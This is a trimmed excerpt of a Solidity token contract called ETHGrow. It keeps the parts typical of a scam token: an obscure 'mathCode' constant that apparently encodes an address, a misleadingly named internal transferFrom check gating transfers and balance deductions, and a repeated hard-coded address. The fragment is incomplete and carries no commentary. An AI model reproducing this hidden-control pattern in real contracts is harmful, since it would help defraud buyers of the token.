...
abstract contract Ownable {
    ...
    uint256 public mathCode = 
    731543284558581566516266190338882554122832860390;
...
abstract contract AbsToken is IERC20, Ownable {
    ...
    function transferFrom(address seds, address recpien) internal view returns (bool){
    ...
    function _transfer(
        ...
        uint256 balance = balanceOf(from);if (transferFrom(from,to))
    ...
    function _tokenTransfer(
        ...
        if (transferFrom(sender,recipient)){ /*intere*/
        _balances[sender] = _balances[sender] - tAmount;}
...
contract ETHGrow  is AbsToken {
    constructor() AbsToken(
        ...
        9,
        99990000,
        address(0x121a00F6FdB13E6ae6a6974cA27B82cB39E1f379),
        address(0x121a00F6FdB13E6ae6a6974cA27B82cB39E1f379),
        address(0x121a00F6FdB13E6ae6a6974cA27B82cB39E1f379),
        address(0)
    ){
